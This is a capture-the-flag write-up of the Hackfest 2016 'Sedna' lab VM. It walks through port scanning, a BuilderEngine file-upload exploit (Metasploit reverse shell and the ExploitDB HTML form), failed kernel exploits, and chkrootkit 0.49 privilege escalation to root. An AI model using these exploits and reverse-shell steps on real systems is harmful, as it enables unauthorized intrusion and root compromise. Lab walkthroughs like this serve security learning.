---
layout: post
title: "Hackfest 2016: Sedna"
date: 2018-11-16 14:22:02 -0500
comments: true
categories: [penetration testing, writeups]
keywords: sedna, pentest lab, vulnhub, ctf, boot2root, hackfest sedna, hackfest 2016 sedna
description: Sedna writeup
---

This is another machine in the Hackfest 2016 series.

> There are 4 flags on this machine One for a shell One for root access Two for doing post 
> exploitation on Sedna

Alrighty, let's hack the planet!

<!-- more -->

Plenty of open ports:

``` 
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)
53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA TOP AUTH-RESP-CODE SASL PIPELINING STLS RESP-CODES UIDL
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          48644/tcp  status
|_  100024  1          58324/udp  status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login STARTTLS more SASL-IR LITERAL+ have IMAP4rev1 listed OK capabilities Pre-login LOGINDISABLEDA0001 ID ENABLE IDLE LOGIN-REFERRALS
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp   open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
48644/tcp open  status      1 (RPC #100024)
```

Hit a couple of walls with the first enumeration attempts. The robots.txt has a Hackers entry that doesn't lead anywhere. Nothing usable for the bind server and the OpenSSH. enum4linux came back empty because I had no username/password pair to specify. And the Tomcat server did not use default credentials. So I fired up Gobuster and it found some additional things to check:

``` 
gobuster -w /usr/share/wordlists/dirb/big.txt -u http://192.168.145.128/

=====================================================
2018/11/16 14:56:38 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/blocks (Status: 301)
/files (Status: 301)
/modules (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
/system (Status: 301)
/themes (Status: 301)
```

I visited each link, there are lots of directory listings for what appears to be a blog and ecommerce application. Some directories blocked me from entering, but I did find an indication of the target application inside http://192.168.145.128/themes/default_theme_2016/description.txt 

``` 
Default Theme 2016 for BuilderEngine V3.
```

Searching for BuilderEngine exploits gave me 2 results, 1 exploitDB exploit and 1 Metasploit module. Let's see both in action, starting with Metasploit!

## Low privilege shell - Metasploit

``` 
search builderengine

Matching Modules
================

   Name                                          Disclosure Date  Rank       Check  Description
   ----                                          ---------------  ----       -----  -----------
   exploit/multi/http/builderengine_upload_exec  2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution

Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      192.168.145.128  yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to BuilderEngine
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.145.133  yes       The listen address (an interface may be specified)
   LPORT  8000             yes       The listen port
```

Ran it and got a Meterpreter shell:

``` 
msf exploit(multi/http/builderengine_upload_exec) > run

[*] Started reverse TCP handler on 192.168.145.133:8000 
[+] Our payload is at: ppWvWjKRuV.php. Calling payload...
[*] Calling payload...
[*] Meterpreter session 1 opened (192.168.145.133:8000 -> 192.168.145.128:53518) at 2018-11-16 15:21:54 -0500
[+] Deleted ppWvWjKRuV.php

meterpreter > 
```

The kernel is old, so plenty of privilege escalations should be available:

``` 
meterpreter > sysinfo
Computer    : Sedna
OS          : Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686
Meterpreter : php/linux

meterpreter > cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
```

I used Searchsploit to look for Ubuntu 14.04 exploits and went with the [37292.c overlayfs exploit](https://www.exploit-db.com/exploits/37292/)/ I downloaded it to the machine, compiled it, ran it..and surprise, no root! I also tried the Apport exploit, still no luck. While looking around though, I did find the low privilege flag:

``` 
meterpreter > cat /var/www/flag.txt
bfbb7e6e6e88d9ae66848b9aeac6b289
```

Before continuing with rooting the machine, I went back getting a shell without Metasploit.

## Low privilege shell - manual

Here's the ExploitDB variant of arbitrary file upload:

``` 
cat 40390.php 
<!-- 
# Exploit Title: BuilderEngine 3.5.0 Remote Code Execution via elFinder 2.0
# Date: 18/09/2016
# Exploit Author: metanubix
# Vendor Homepage: http://builderengine.org/
# Software Link: http://builderengine.org/page-cms-download.html
# Version: 3.5.0
# Tested on: Kali Linux 2.0 64 bit
# Google Dork: intext:"BuilderEngine Ltd. All Right Reserved"

1) Unauthenticated Unrestricted File Upload:

	POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/

	Vulnerable Parameter: files[]

	We can upload test.php and reach the file via the following link:
	/files/test.php
-->
<html>
<body>
<form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
	<input type="file" name="files[]" />
	<input type="submit" value="send" />
</form>
</body>
</html>
```

I created a HTML file with the above code, changing localhost to the Sedna IP. Then I used it to upload a reverse shell:

{% img center /images/pentest/sedna/form.jpg 'upload' 'upload form' %}

Then I went to http://192.168.145.128/files/shell.php and got the shell on my Netcat listener. Back to searching for ways to get root. I also find a possible post-exploitation flag in */etc/passwd*:

``` 
crackmeforpoints:x:1000:1000::/home/crackmeforpoints:
```

Cracking the password for this user might be another flag, but first I need root. Since the exploits I've tried so far didn't work, I decided to go down the [dirtycow](https://www.exploit-db.com/exploits/40839/) route. Unfortunately, that didn't work either, besides crashing the kernel. Well, I did not expect for so many privilege escalation exploits to fail. 

## Getting root

The solution came from something unexpected..and that needed a less targeted enumeration..more like generally looking around the box. Inside /etc, I noticed *chkrootkit* was present. I searched for available exploits and found a privilege escalation one:

``` 
searchsploit chkrootkit
--------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                   |  Path
                                                                                 | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------- ----------------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                             | exploits/linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                     | exploits/linux/local/33899.txt
--------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

The exploit is available for version 0.49, so let's see what version is on the box:

``` 
www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V
./chkrootkit -V
chkrootkit version 0.49
```

Perfect! I decided to use Metasploit for this, I kept getting errors in my shell related to previous overlayfs attempts. But the way to do it manually is to put an executable file called *update* with content of your choice in /tmp and wait for chkrootkit to run it as root.

Metasploit came through and finally, I got root:

``` 
msf exploit(unix/local/chkrootkit) > options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting       Required  Description
   ----        ---------------       --------  -----------
   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
   SESSION                           yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(unix/local/chkrootkit) > set SESSION 1
SESSION => 1
msf exploit(unix/local/chkrootkit) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP double handler on 192.168.145.133:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo EzISATvm3xKkw6bX;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "EzISATvm3xKkw6bX\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.145.133:4444 -> 192.168.145.128:37176) at 2018-11-17 08:05:04 -0500
[+] Deleted /tmp/update
whoami
root
```

Got the root flag:

``` 
cat /root/flag.txt
a10828bee17db751de4b936614558305
```

It was not over though, there should be one more flag, so I remembered the Tomcat server and looked inside <code>/etc/tomcat7/tomcat-users.xml</code> to find the username and password for Tomcat:

``` 
<user username="tomcat" password="submitthisforpoints" roles="manager-gui"/>
```

I didn't want to crack the password for the 4th flag, so I decided to call it a day at 3/4 flags.

``` 
 _______________________________________
/ I must have a prodigious quantity of  \
| mind; it takes me as much as a week   |
| sometimes to make it up.              |
|                                       |
\ -- Mark Twain, "The Innocents Abroad" /
 ---------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
